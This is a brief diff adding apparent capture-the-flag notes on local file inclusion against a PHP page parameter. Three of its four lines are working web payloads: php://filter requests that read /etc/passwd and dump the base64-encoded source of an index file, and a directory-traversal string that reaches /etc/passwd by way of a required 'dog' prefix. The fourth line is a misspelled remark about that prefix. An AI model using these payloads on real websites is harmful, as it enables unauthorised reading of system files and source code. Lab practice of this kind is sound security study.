@@ -1,0 +1,4 @@
+?page=php://filter/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=index
+how you have found out the dog is cumpalsary string
+?page=dog/../../../../../etc/passwd&ext=
